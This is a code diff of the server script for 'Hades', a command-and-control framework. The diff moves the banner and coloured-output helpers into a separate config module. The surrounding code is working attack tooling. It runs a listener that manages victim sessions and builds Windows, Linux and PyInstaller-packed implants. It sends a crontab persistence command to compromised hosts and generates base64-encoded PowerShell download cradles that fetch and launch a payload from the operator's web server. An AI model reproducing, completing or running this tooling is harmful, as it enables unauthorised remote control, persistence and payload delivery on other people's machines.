@@ -13,87 +13,32 @@ import time
 from datetime import datetime
 from colorama import *
 from prettytable import PrettyTable
+from Config import design
+from Config import colours
 
 
-# Banner - Move to separate config file after proj completion
 def banner():
-    # Clear Screen
-    os.system("cls||clear")
-
-    # Add seperator
-    print(Fore.LIGHTRED_EX + "".center(80, "=") + Style.RESET_ALL)
-
-    # Server Banner
-    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT)
-    pyfiglet.print_figlet("Hades", font="calgphy2", justify="center")
-    print(Style.RESET_ALL)
-
-    # Credits
-    print(Fore.LIGHTMAGENTA_EX + "By: Lavender-exe" + Style.RESET_ALL)
-    print(Fore.LIGHTGREEN_EX + '''
-Credits: "Joe Helle"
-https://ko-fi.com/s/0c3776a2a0
-          ''' + Style.RESET_ALL)
-    print(Fore.LIGHTRED_EX + "".center(80, "=") + Style.RESET_ALL)
-    print("")
+    design.banner()
 
 
-# Help Menu - Move to separate config file after proj completion
 def help():
-    print(Fore.YELLOW + """
- /$$   /$$           /$$          
-| $$  | $$          | $$          
-| $$  | $$  /$$$$$$ | $$  /$$$$$$ 
-| $$$$$$$$ /$$__  $$| $$ /$$__  $$
-| $$__  $$| $$$$$$$$| $$| $$  \ $$
-| $$  | $$| $$_____/| $$| $$  | $$
-| $$  | $$|  $$$$$$$| $$| $$$$$$$/
-|__/  |__/ \_______/|__/| $$____/ 
-                        | $$      
-                        | $$      
-                        |__/      
-=======================================================================================
+    design.help()
 
-Listener Commands
----------------------------------------------------------------------------------------
+def success(function):
+    colours.success(function)
 
-listeners -g --generate           --> Generate Listener
+def error(function):
+    colours.error(function)
 
-Session Commands
----------------------------------------------------------------------------------------
+def info(function):
+    colours.info(function)
 
-sessions -l --list                --> List Sessions
-sessions -i --interact            --> Interact with Session
-sessions -k --kill <value>        --> Kill Active Session
-
-Client Commands
----------------------------------------------------------------------------------------
-
-persist / pt                      --> Persist Payload (After Interacting with Session) 
-background / bg                   --> Background Session
-exit                              --> Kill Client Connection
-
-Payload Commands
----------------------------------------------------------------------------------------
-
-winplant.py                       --> Windows Python Implant
-exeplant.py                       --> Windows Executable Implant
-linplant.py                       --> Linux Implant
-pshell_shell                      --> Powershell Implant
-
-Misc Commands
----------------------------------------------------------------------------------------
-
-help / h                          --> Show Help Menu
-    """ + Style.RESET_ALL)
-
-    # Seperator
-    print(Fore.LIGHTRED_EX + "".center(80, "=") + Style.RESET_ALL)
-    print("")
+def quit(function):
+    colours.quit(function)
 
 
 def comm_in(targ_id):
-    print(Fore.GREEN + "[+] Waiting for Response..\n" + Style.RESET_ALL)
+    info("Waiting for Response..\n")
     response = targ_id.recv(4096).decode()
     response = base64.b64decode(response)
     response = response.decode().strip()
@@ -155,14 +100,14 @@ def target_comm(targ_id, targets, num):
                 if targets[num][6] == 2:
                     persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                     targ_id.send(persist_command.encode())
-                    print(Fore.GREEN + "[+] Run this command to clean up crontab: \n crontab -r" + Style.RESET_ALL)
+                    success("Run this command to clean up crontab: \n crontab -r")
 
-                print(Fore.GREEN + "[+] Persistence Technique Completed" + Style.RESET_ALL)
+                success("Persistence Technique Completed")
 
             else:
                 response = comm_in(targ_id)
                 if response == 'exit':
-                    print(Fore.RED + "[-] Client Connection Closed" + Style.RESET_ALL)
+                    error("[-] Client Connection Closed")
                     targ_id.close()
                     break
 
@@ -171,7 +116,7 @@ def target_comm(targ_id, targets, num):
 
 def listener_handler():
     sock.bind((host_ip, int(host_port)))
-    print(Fore.BLUE + '[i] Awaiting connection from client...\n' + Style.RESET_ALL)
+    info('Awaiting connection from client...\n')
     sock.listen()
     t1 = threading.Thread(target=comm_handler)
     t1.start()
@@ -269,7 +214,7 @@ def winplant():
     if os.path.exists(f'{check_cwd}\\winplant.py'):
         shutil.copy('winplant.py', file_name)
     else:
-        print(Fore.RED + "[-] File Not Found - winplant.py" + Style.RESET_ALL)
+        error("File Not Found - winplant.py")
 
     # Write IP to file
     with open(file_name) as f:
@@ -287,7 +232,7 @@ def winplant():
         f.write(new_port)
         f.close()
 
-    print(Fore.GREEN + f'[+] Payload {file_name} Created at {check_cwd}' + Style.RESET_ALL)
+    success(f'Payload {file_name} Created at {check_cwd}')
 
 
 # Linux Payloads
@@ -299,7 +244,7 @@ def linplant():
     if os.path.exists(f'{check_cwd}\\linplant.py'):
         shutil.copy('linplant.py', file_name)
     else:
-        print(Fore.RED + "[-] File Not Found - linplant.py" + Style.RESET_ALL)
+        error("File Not Found - linplant.py")
 
     # Write IP to file
     with open(file_name) as f:
@@ -317,7 +262,7 @@ def linplant():
         f.write(new_port)
         f.close()
 
-    print(Fore.GREEN + f'[+] Payload {file_name} Created at {check_cwd}' + Style.RESET_ALL)
+    success(f'[+] Payload {file_name} Created at {check_cwd}')
 
 
 # EXE Payloads
@@ -330,7 +275,7 @@ def exeplant():
     if os.path.exists(f'{check_cwd}\\winplant.py'):
         shutil.copy('winplant.py', file_name)
     else:
-        print(Fore.RED + "[-] File Not Found - winplant.py" + Style.RESET_ALL)
+        error("File Not Found - winplant.py")
 
     # Write IP to file
     with open(file_name, ) as f:
@@ -347,9 +292,9 @@ def exeplant():
 
     # Verbose File Path
     if os.path.exists(f'{file_name}'):
-        print(Fore.GREEN + f"[+] {file_name} saved to {check_cwd}" + Style.RESET_ALL)
+        success(f"{file_name} saved to {check_cwd}")
     else:
-        print(Fore.RED + f"[-] Error occured during payload generation" + Style.RESET_ALL)
+        error(f"Error occurred during payload generation")
 
     # PyInstaller Command Handling
     pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
@@ -359,10 +304,10 @@ def exeplant():
 
     shutil.rmtree('build')
     if os.path.exists(f'{check_cwd}\\{exe_file}'):
-        print(Fore.GREEN + f"[+] Executable Generated to Current Directory: {exe_file}" + Style.RESET_ALL)
+        success(f"Executable Generated to Current Directory: {exe_file}")
 
     else:
-        print(Fore.RED + f"[-] Executable Generation Failed" + Style.RESET_ALL)
+        error(f"Executable Generation Failed")
 
 
 # Powershell Cradle
@@ -373,18 +318,20 @@ def pshell_cradle():
     runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
     randomised_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
     randomised_exe_file = f"{randomised_exe_file}.exe"
-    print(Fore.BLUE + f"[i] Run this command to start a web server\npython3 -m http.server -b {web_server_ip} {web_server_port}" + Style.RESET_ALL)
+    info(f"Run this command to start a web server\npython3 -m http.server -b {web_server_ip} {web_server_port}")
 
-    runner_cal_unencoded = f"iex (New-Object Net.WebClient).DownloadString('http://{web_server_ip}:{web_server_port}/{payload_name}')".encode('utf-16le')
+    runner_cal_unencoded = f"iex (New-Object Net.WebClient).DownloadString('http://{web_server_ip}:{web_server_port}/{payload_name}')".encode(
+        'utf-16le')
     with open(runner_file, 'w') as f:
-        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{randomised_exe_file} -outfile {randomised_exe_file}; Start-Process -FilePath {randomised_exe_file}')
+        f.write(
+            f'powershell -c wget http://{web_server_ip}:{web_server_port}/{randomised_exe_file} -outfile {randomised_exe_file}; Start-Process -FilePath {randomised_exe_file}')
         f.close()
     b64_runner_cal = base64.b64encode(runner_cal_unencoded)
     b64_runner_cal = b64_runner_cal.decode()
 
-    print(Fore.GREEN + f"\n[+] Encoded Payload\n\npowershell -e {b64_runner_cal}" + Style.RESET_ALL)
+    success(f"\n[+] Encoded Payload\n\npowershell -e {b64_runner_cal}")
     b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
-    print(Fore.GREEN + f"\n[+] Unencoded Payload\n\n{b64_runner_cal_decoded}" + Style.RESET_ALL)
+    success(f"\n[+] Unencoded Payload\n\n{b64_runner_cal_decoded}")
 
 
 # Main Function
@@ -428,21 +375,21 @@ if __name__ == "__main__":
                 if listener_counter > 0:
                     winplant()
                 else:
-                    print(Fore.RED + "[-] Generate Listener First" + Style.RESET_ALL)
+                    error("Generate Listener First")
 
             # Linux Payload
             if command == 'linplant.py':
                 if listener_counter > 0:
                     linplant()
                 else:
-                    print(Fore.RED + "[-] Generate Listener First" + Style.RESET_ALL)
+                    error("Generate Listener First")
 
             # Executable Payload
             if command == 'exeplant.py':
                 if listener_counter > 0:
                     exeplant()
                 else:
-                    print(Fore.RED + "[-] Generate Active Listener First" + Style.RESET_ALL)
+                    error("Generate Listener First")
 
             # Generate Sessions Commands
             if command.split(" ")[0] == 'sessions':
@@ -453,7 +400,7 @@ if __name__ == "__main__":
 
                     # Define Table
                     myTable = PrettyTable()
-
+                    print(Fore.YELLOW + Style.BRIGHT)
                     # Table Headers
                     myTable.field_names = ["Session",
                                            "Status",  # 7
@@ -477,7 +424,7 @@ if __name__ == "__main__":
 
                     # Print Table
                     print(myTable)
-
+                    print(Style.RESET_ALL)
                 # Interact with Session                        
                 if command.split(" ")[1] == '-i' or command.split(" ")[1] == '--interact':
                     try:
@@ -486,10 +433,9 @@ if __name__ == "__main__":
                         if (targets[num])[7] == 'Active':
                             target_comm(targ_id, targets, num)
                         else:
-                            print(
-                                Fore.RED + f"[-] The Dead Don't Talk - Cannot communicate with agent" + Style.RESET_ALL)
+                            error(f"The Dead Don't Talk - Cannot communicate with agent")
                     except IndexError:
-                        print(Fore.RED + f"[-] Session {num} does not exist" + Style.RESET_ALL)
+                        error(f"Session {num} does not exist")
 
                 # Kill Session
                 if command.split(" ")[1] == '-k' or command.split(" ")[1] == '--kill':
@@ -499,11 +445,11 @@ if __name__ == "__main__":
                         if (targets[num])[7] == 'Active':
                             kill_sig(targ_id, 'exit')
                             targets[num][7] = 'Dead'
-                            print(Fore.RED + f"[-] Session {num} Killed" + Style.RESET_ALL)
+                            error(f"Session {num} Killed")
                         else:
-                            print(Fore.RED + f"[-] Session {num} is already dead" + Style.RESET_ALL)
+                            error(f"Session {num} is already dead")
                     except IndexError:
-                        print(Fore.RED + f"[-] Session {num} does not exist" + Style.RESET_ALL)
+                        error(f"Session {num} does not exist")
                     except NameError:
                         continue
 
@@ -537,7 +483,7 @@ if __name__ == "__main__":
                 kill_flag = 1
                 if listener_counter > 0:
                     sock.close()
-                print(Fore.LIGHTRED_EX + f"Quitting..." + Style.RESET_ALL)
+                quit(f"Quitting...")
                 break
             else:
                 continue
